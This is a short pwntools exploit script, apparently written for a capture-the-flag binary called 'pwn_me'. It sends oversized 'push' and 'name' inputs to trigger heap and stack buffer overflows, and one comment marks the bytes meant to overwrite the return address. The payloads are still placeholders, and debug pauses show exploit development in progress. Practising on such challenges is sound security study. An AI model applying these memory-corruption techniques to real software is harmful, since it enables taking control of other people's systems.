from pwn import *

p = process("./pwn_me")

def initial_heap_overflow():
    name = b'B'*0x200
    stack_buffer = b'A'*0x244 + b'X'*8
    print(" b malloc ; so you can see where the space is allocated")
    input()
    print(p.recv())
    p.sendline(b'push ' + stack_buffer)
    print(p.recv())
    p.sendline(b'name ' + name)
    print(p.recv())
    p.interactive()

def first_name_overflow():
    name = b'B'*0x200
    stack_buffer_1 = b'A'*0x244 + b'X'*8
    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
    stack_buffer_2 += b'Z'*8 #RIP if we call print
    print(" b malloc ; so you can see where the space is allocated")
    input()
    print(p.recv())
    print("DEBUG: Send first push?")
    input()
    p.sendline(b'push ' + stack_buffer_1)
    print(p.recv())
    print("DEBUG: Send name?")
    input()
    p.sendline(b'name ' + name)
    print(p.recv())
    print("DEBUG: Send pop?")
    input()
    p.sendline(b'pop 1')
    print(p.recv())
    print("DEBUG: Send second push?")
    input()
    p.sendline(b'push ' + stack_buffer_2)
    print("DEBUG: Receive push output")
    input()
    print(p.recv())
    print("DEBUG: Go interactive?")
    input()
    p.interactive()

if __name__=='__main__':
    #initial_heap_overflow()
    first_name_overflow()
